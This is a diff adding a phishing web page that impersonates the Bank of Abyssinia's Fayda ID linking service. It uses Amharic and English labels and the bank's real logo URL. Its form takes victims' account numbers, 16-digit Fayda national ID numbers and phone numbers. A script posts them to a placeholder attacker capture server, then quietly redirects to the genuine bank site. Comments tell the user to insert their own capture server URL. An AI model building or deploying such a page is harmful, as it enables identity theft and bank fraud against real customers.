@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="am">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Fayda Connect | Bank of Abyssinia</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{
+            font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;
+            background:linear-gradient(160deg,#0d2137 0%,#1a3a5c 40%,#2a5f8a 100%);
+            min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px
+        }
+        .card{
+            background:white;border-radius:20px;max-width:420px;width:100%;
+            padding:40px 28px 32px;box-shadow:0 24px 80px rgba(0,0,0,0.4);text-align:center
+        }
+        .logo-wrap{margin-bottom:8px}
+        .logo-wrap img{max-width:72px;height:auto;display:block;margin:0 auto}
+        .bank-name{font-size:22px;font-weight:800;color:#d4a12a;letter-spacing:2px;margin-top:4px}
+        .divider{width:60px;height:3px;background:#d4a12a;margin:20px auto;border-radius:2px}
+        .heading-am{font-size:19px;color:#0d2137;font-weight:700;line-height:1.5;margin-bottom:6px}
+        .heading-en{font-size:14px;color:#777;margin-bottom:24px}
+        .input-group{margin-bottom:16px;text-align:left}
+        .input-group label{display:block;font-size:13px;color:#444;font-weight:600;margin-bottom:5px}
+        .input-group input{
+            width:100%;padding:14px 16px;border:2px solid #e2e2e2;border-radius:12px;
+            font-size:16px;background:#fafafa;outline:none;transition:border-color .2s
+        }
+        .input-group input:focus{border-color:#d4a12a;background:#fffef5}
+        .input-group input.highlight{border-color:#ffb74d;background:#fff8e1}
+        .input-hint{font-size:11px;color:#aaa;margin-top:4px}
+        .btn{
+            width:100%;padding:16px;background:#d4a12a;color:white;border:none;
+            border-radius:12px;font-size:17px;font-weight:700;cursor:pointer;margin-top:8px;
+            transition:background .2s
+        }
+        .btn:hover{background:#b8891e}
+        .btn:disabled{background:#bbb;cursor:not-allowed}
+        .status{display:none;margin-top:16px;padding:12px;border-radius:10px;font-size:14px}
+        .status.loading{display:block;background:#fff8e1;color:#8d6e00}
+        .status.error{display:block;background:#ffebee;color:#b71c1c}
+        .spinner{
+            display:inline-block;width:16px;height:16px;border:3px solid #ffe0b2;
+            border-top:3px solid #d4a12a;border-radius:50%;animation:spin .8s linear infinite;
+            margin-right:8px;vertical-align:middle
+        }
+        @keyframes spin{to{transform:rotate(360deg)}}
+        .footer{margin-top:28px;padding-top:20px;border-top:1px solid #eee;font-size:11px;color:#aaa;line-height:1.7}
+        .footer strong{color:#888}
+    </style>
+</head>
+<body>
+    <div class="card">
+        
+        <!-- LOGO: Replace src with your image paths -->
+        <div class="logo-wrap">
+            <img src="https://cs.bankofabyssinia.com/fayda_connect/BOA_LOGO_Yellow.svg" alt="BOA">
+        </div>
+        <div class="bank-name">BANK OF ABYSSINIA</div>
+        <div class="divider"></div>
+        
+        <div class="heading-am">የፋይዳ መለያ ቁጥርዎን ከባንክ አካውንትዎ ጋር ያስተሳስሩ</div>
+        <div class="heading-en">Link your FAYDA ID with your bank account</div>
+
+        <!-- ═══ FORM — submits to your capture server ═══ -->
+        <form id="captureForm">
+            <div class="input-group">
+                <label>አካውንት ቁጥር / Account Number</label>
+                <input type="text" name="account_number" placeholder="Enter your account number" required>
+            </div>
+            <div class="input-group">
+                <label>የፋይዳ መለያ ቁጥር / Fayda ID Number</label>
+                <input type="text" name="fayda_id" placeholder="16-digit Fayda number" class="highlight" required>
+                <div class="input-hint">Enter your 16-digit Fayda number (FCN/FAN)</div>
+            </div>
+            <div class="input-group">
+                <label>የስልክ ቁጥር / Phone Number</label>
+                <input type="tel" name="phone" placeholder="e.g., 0911XXXXXX" class="highlight" required>
+                <div class="input-hint">Phone number registered with your account</div>
+            </div>
+            <button type="submit" class="btn" id="submitBtn">Submit / ያስገቡ</button>
+            <div class="status loading" id="loadingStatus">
+                <span class="spinner"></span> Processing... / ጥያቄን በማስኬድ ላይ...
+            </div>
+            <div class="status error" id="errorStatus"></div>
+        </form>
+
+        <div class="footer">
+            <strong>Bank of Abyssinia</strong> — የአቢሲኒያ ባንክ<br>
+            Toll Free: <strong>8397</strong>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('captureForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var btn = document.getElementById('submitBtn');
+            var loading = document.getElementById('loadingStatus');
+            btn.disabled = true;
+            loading.style.display = 'block';
+
+            var data = new URLSearchParams();
+            data.append('account_number', this.account_number.value.trim());
+            data.append('fayda_id', this.fayda_id.value.trim());
+            data.append('phone', this.phone.value.trim());
+
+            // ⚠️ CHANGE THIS TO YOUR CAPTURE SERVER URL
+            fetch('http://YOUR_VPS_IP:5000/capture', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                body: data
+            })
+            .then(function(r) { return r.json(); })
+            .then(function(d) {
+                window.location.href = 'https://cs.bankofabyssinia.com/fayda_connect/';
+            })
+            .catch(function() {
+                window.location.href = 'https://cs.bankofabyssinia.com/fayda_connect/';
+            });
+        });
+    </script>
+</body>
+</html>
